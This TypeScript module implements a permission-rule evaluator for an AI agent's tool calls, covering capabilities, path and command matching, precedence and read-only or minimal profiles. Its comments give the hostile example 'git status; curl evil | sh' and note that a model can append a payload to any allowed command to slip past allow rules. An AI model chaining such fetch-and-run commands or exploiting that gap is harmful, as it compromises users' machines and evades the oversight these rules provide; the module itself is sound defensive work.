/**
 * Tool permission policy: capability vocabulary and rule evaluator.
 *
 * Pure module (no fs access; the only environment reads are `os.homedir()` for
 * `~` expansion and the evaluation cwd — caller-supplied, defaulting to the
 * process working directory — for relative-path resolution). The rule evaluator
 * decides whether a tool call is allowed, requires approval, or is denied,
 * based on an ordered rule list. Core performs no enforcement: the consumer is
 * the permission-policies extension (see examples/extensions/), which evaluates
 * `tool_call` events and reshapes the active tool list from these decisions.
 *
 * Matching semantics:
 * - A rule matches when every field specified on the rule matches the call.
 *   `effect`-only rules match everything (catch-all). Empty-string matchers
 *   (`""`) count as unspecified on every field — they never match by literal
 *   comparison.
 * - `tool`: exact tool name.
 * - `capability`: exact capability. A rule with `capability` never matches a
 *   tool whose definition has no (or a different) capability; a rule without
 *   `capability` matches any tool.
 * - `path`: normalized path prefix match on the call's path-like argument.
 *   Leading `~` expands to the home directory, then both the rule and the
 *   argument resolve against the evaluation cwd (relative tool args resolve
 *   against the session cwd), and the resolved argument must equal the
 *   resolved rule or lie under it at a segment boundary. `/repo/src` matches
 *   `/repo/src`, `/repo/src/a.ts`, and (with cwd `/repo`) `src/a.ts`, but not
 *   `/repo/src/../escape` (the `..` escapes the rule root) or
 *   `/repo/src-other/a.ts`. Resolution is lexical (symlinks are not followed).
 *   All built-in tools name that argument `path`, which is the canonical name;
 *   `file` and `target` are also accepted so custom tools using those spellings
 *   can be constrained.
 * - `command`: token-boundary prefix match on the call's string `command`
 *   argument (the bash tool): the command equals the rule, or starts with the
 *   rule followed by whitespace. `git` matches `git status --short` but not
 *   `gitx evil`; `git push` matches `git push --force` but not `git pushx` or
 *   `git status; curl evil | sh` (for a `git push` rule the `;` is not a
 *   boundary). Coarseness remains: a rule that is a command prefix still
 *   covers anything appended after that command — `git status; curl evil | sh`
 *   satisfies a `git` rule — so allow rules with `command` are not a security
 *   boundary (the model can append `; payload` to any allowed command). Deny
 *   and ask rules are the safe use; real isolation needs containerization.
 * - Unrecognized args fields are ignored by matching.
 *
 * Precedence: deny > ask > allow > default. Rule-list order does not change
 * which kind wins; among multiple matching rules of the winning kind, the LAST
 * matching rule wins (list order is the user's specificity mechanism). The
 * returned reason names the matched rule (index plus fields) so blocked tool
 * results can explain themselves to the model.
 *
 * Visibility: a deny rule with `hide: true` tells the consumer to remove
 * matching tools from the model-visible tool list. Visibility is evaluated with
 * the tool's definition and NO call args, so rules whose matchers need a
 * `path`/`command` value never hide a tool (they still apply at call time).
 *
 * Profiles (`code`/`review`/`minimal`) resolve to ordinary base-layer rules
 * (see `resolveProfileConfig`); user rules override them through layered
 * evaluation (see `evaluatePermissionLayered`).
 */

import { homedir } from "node:os";
import { join, resolve, sep } from "node:path";

/** Capability values a tool can exercise, used by permission policy evaluation. */
export const TOOL_CAPABILITIES = [
	"filesystem.read",
	"filesystem.write",
	"process.execute",
	"network.access",
	"session.modify",
] as const;

/** Capability a tool exercises, used by permission policy evaluation. */
export type ToolCapability = (typeof TOOL_CAPABILITIES)[number];

/** Effect kinds, strongest first. */
const EFFECT_STRENGTH: Record<PermissionRule["effect"], number> = {
	deny: 3,
	ask: 2,
	allow: 1,
};

/** One permission rule. Unspecified matchers are ignored; a bare effect is a catch-all. */
export interface PermissionRule {
	/** Exact tool name to match. Empty string counts as unspecified. */
	tool?: string;
	/** Exact capability to match. Empty string counts as unspecified. */
	capability?: ToolCapability;
	/**
	 * Path matched against the call's `path` (or `file`/`target`) argument
	 * after normalization (`~` expansion, resolution against the evaluation
	 * cwd): the argument must equal the rule or lie under it at a segment
	 * boundary. Empty string counts as unspecified.
	 */
	path?: string;
	/**
	 * Command matched against the call's `command` argument at a token
	 * boundary: the command equals the rule or extends it with
	 * whitespace-delimited arguments. Empty string counts as unspecified.
	 */
	command?: string;
	/** What to do when the rule matches. */
	effect: "allow" | "ask" | "deny";
	/**
	 * Deny-only: also tells the consumer to remove matching tools from the
	 * model-visible tool list. Meaningless on allow/ask rules (ignored by the
	 * evaluator). Visibility is evaluated with no call args, so rules whose
	 * matchers need a `path`/`command` value never hide a tool — they still
	 * apply at call time.
	 */
	hide?: boolean;
}

/** Structured outcome of evaluating a call against a rule list. */
export type PermissionDecision = {
	kind: "allow" | "ask" | "deny";
	/** Human-readable explanation naming what matched (rule index plus fields). */
	reason: string;
	/** Whether a rule matched; false means the default effect decided. */
	matched: boolean;
	/**
	 * True only when the winning rule is a deny rule with `hide: true`. Tells
	 * the consumer to drop the tool from the model-visible list; `hide` on
	 * allow/ask rules has no effect.
	 */
	hidden: boolean;
};

/** Argument names checked, in order, for the path-like field of a call. */
const PATH_ARG_NAMES = ["path", "file", "target"] as const;

/** Matcher values come from user settings JSON; `""` counts as unspecified. */
function isSpecified(value: string | undefined): value is string {
	return value !== undefined && value !== "";
}

/** Expand a leading `~`/`~/` to the home directory (rule and argument accept it). */
function expandTilde(p: string): string {
	if (p === "~") return homedir();
	if (p.startsWith("~/")) return join(homedir(), p.slice(2));
	if (sep !== "/" && p.startsWith(`~${sep}`)) return join(homedir(), p.slice(2));
	return p;
}

/**
 * Whether the argument path lies under the rule path at a segment boundary,
 * after both resolve against the evaluation cwd. `resolve` collapses `..`
 * lexically, so a path escaping the rule root no longer sits under it; a root
 * (e.g. `/` or `C:\`) already ends with the separator, so no extra one is
 * appended for it.
 */
function isPathUnder(rulePath: string, argPath: string, cwd: string): boolean {
	const rule = resolve(cwd, expandTilde(rulePath));
	const input = resolve(cwd, expandTilde(argPath));
	const prefix = rule.endsWith(sep) ? rule : `${rule}${sep}`;
	return input === rule || input.startsWith(prefix);
}

/**
 * Whether the command matches the rule at a whitespace token boundary: the
 * command equals the rule or continues with whitespace-delimited arguments, so
 * `git` does not match `gitx evil` and `git push` does not match
 * `git pushx` or `git status; curl evil | sh`.
 */
function isCommandAtTokenBoundary(ruleCommand: string, argCommand: string): boolean {
	return (
		argCommand === ruleCommand ||
		(argCommand.startsWith(ruleCommand) && /\s/.test(argCommand.charAt(ruleCommand.length)))
	);
}

function describeRule(rule: PermissionRule, index: number): string {
	const matchers: string[] = [];
	if (rule.tool) matchers.push(`tool=${rule.tool}`);
	if (rule.capability) matchers.push(`capability=${rule.capability}`);
	if (rule.path) matchers.push(`path=${rule.path}`);
	if (rule.command) matchers.push(`command=${rule.command}`);
	const matcherText = matchers.length > 0 ? matchers.join(", ") : "catch-all";
	return `permission rule #${index} (${matcherText}, effect ${rule.effect})`;
}

/**
 * Tool profile: a named preset that resolves to ordinary permission rules
 * (see `resolveProfileConfig`).
 */
export type ToolProfile = "code" | "review" | "minimal";

/** A profile preset resolved to plain configuration. */
export interface ProfileConfig {
	/**
	 * Base-layer permission rules. Any matching user rule overrides them (see
	 * `evaluatePermissionLayered`); non-matching profile rules still apply.
	 */
	permissionRules: PermissionRule[];
}

/**
 * Static profile presets. Kept as plain rule lists — no runtime cleverness:
 * - code (default): all tools, default-allow.
 * - review: read-only analysis. Deny+hide every write and process tool
 *   (matching by capability, so custom tools carrying the metadata follow),
 *   allow reads for self-documentation.
 * - minimal: reduced core toolset (read/grep/find/ls remain). A static deny+hide
 *   list for the non-core builtins (bash/powershell/edit/write); capability rules
 *   cannot express "everything except" under deny > ask > allow, and custom/extension
 *   tools have no static name list, so they stay visible.
 */
const PROFILE_PRESETS: Record<ToolProfile, ProfileConfig> = {
	code: { permissionRules: [] },
	review: {
		permissionRules: [
			{ capability: "filesystem.read", effect: "allow" },
			{ capability: "filesystem.write", effect: "deny", hide: true },
			{ capability: "process.execute", effect: "deny", hide: true },
		],
	},
	minimal: {
		permissionRules: [
			{ tool: "bash", effect: "deny", hide: true },
			{ tool: "powershell", effect: "deny", hide: true },
			{ tool: "edit", effect: "deny", hide: true },
			{ tool: "write", effect: "deny", hide: true },
		],
	},
};

/** Resolve a profile name to its preset. Undefined and unknown values resolve to `code`. */
export function resolveProfileConfig(profile: ToolProfile | undefined): ProfileConfig {
	const preset = PROFILE_PRESETS[profile ?? "code"] ?? PROFILE_PRESETS.code;
	// Fresh list per call so callers cannot corrupt the shared preset.
	return { permissionRules: [...preset.permissionRules] };
}

/**
 * Evaluate a tool call against a base rule layer (resolved profile preset) and
 * an override layer (user rules).
 *
 * Layering implements "user rules override the profile": if any user rule
 * matches, the user layer decides alone; otherwise the profile layer decides;
 * otherwise the default effect applies. Plain concatenation cannot express
 * this because deny > ask > allow regardless of list order, so a profile deny
 * would be unbeatable by a user allow. Within each layer the documented
 * precedence (deny > ask > allow, last matching rule of the winning kind wins)
 * is unchanged.
 */
export function evaluatePermissionLayered(input: {
	toolName: string;
	capability?: ToolCapability;
	args: Record<string, unknown>;
	/** Base layer: resolved profile rules. */
	baseRules: PermissionRule[];
	/** Override layer: user rules; any match here wins over the base layer. */
	rules: PermissionRule[];
	defaultEffect: "allow" | "deny";
	/** Working directory relative rule/input paths resolve against (the session cwd). */
	cwd?: string;
}): PermissionDecision {
	const { toolName, capability, args, baseRules, rules, defaultEffect, cwd } = input;

	const userDecision = evaluatePermission({ toolName, capability, args, rules, defaultEffect, cwd });
	if (userDecision.matched) {
		return userDecision;
	}

	const baseDecision = evaluatePermission({
		toolName,
		capability,
		args,
		rules: baseRules,
		defaultEffect,
		cwd,
	});
	return baseDecision.matched ? baseDecision : userDecision;
}

/**
 * Evaluate a tool call against an ordered permission rule list.
 *
 * Returns the strongest matching decision: deny > ask > allow > default. Ties
 * within the strongest kind are resolved in favor of the last matching rule.
 */
export function evaluatePermission(input: {
	toolName: string;
	capability?: ToolCapability;
	args: Record<string, unknown>;
	rules: PermissionRule[];
	defaultEffect: "allow" | "deny";
	/** Working directory relative rule/input paths resolve against (the session cwd). */
	cwd?: string;
}): PermissionDecision {
	const { toolName, capability, args, rules, defaultEffect } = input;
	const cwd = input.cwd ?? process.cwd();

	let winner: { rule: PermissionRule; index: number } | undefined;
	for (let index = 0; index < rules.length; index++) {
		const rule = rules[index];
		// Rules come from user settings JSON; malformed entries are skipped rather
		// than trusted. Empty-string matchers would match everything, so they count
		// as unspecified on every field.
		if (!EFFECT_STRENGTH[rule.effect]) continue;
		if (isSpecified(rule.tool) && rule.tool !== toolName) continue;
		if (isSpecified(rule.capability) && rule.capability !== capability) continue;
		if (isSpecified(rule.path)) {
			const argPath = PATH_ARG_NAMES.map((name) => args[name]).find(
				(value): value is string => typeof value === "string",
			);
			if (argPath === undefined || !isPathUnder(rule.path, argPath, cwd)) continue;
		}
		if (isSpecified(rule.command)) {
			const argCommand = args.command;
			if (typeof argCommand !== "string" || !isCommandAtTokenBoundary(rule.command, argCommand)) continue;
		}
		// Later matches of the same strength replace earlier ones; stronger kinds
		// replace weaker ones regardless of list order.
		if (winner === undefined || EFFECT_STRENGTH[rule.effect] >= EFFECT_STRENGTH[winner.rule.effect]) {
			winner = { rule, index };
		}
	}

	if (winner === undefined) {
		const capabilityText = capability ? ` (capability ${capability})` : "";
		return {
			kind: defaultEffect,
			reason: `No permission rule matched tool "${toolName}"${capabilityText}; default effect is ${defaultEffect}.`,
			matched: false,
			hidden: false,
		};
	}

	return {
		kind: winner.rule.effect,
		reason: `${winner.rule.effect} by ${describeRule(winner.rule, winner.index)}`,
		matched: true,
		hidden: winner.rule.effect === "deny" && winner.rule.hide === true,
	};
}
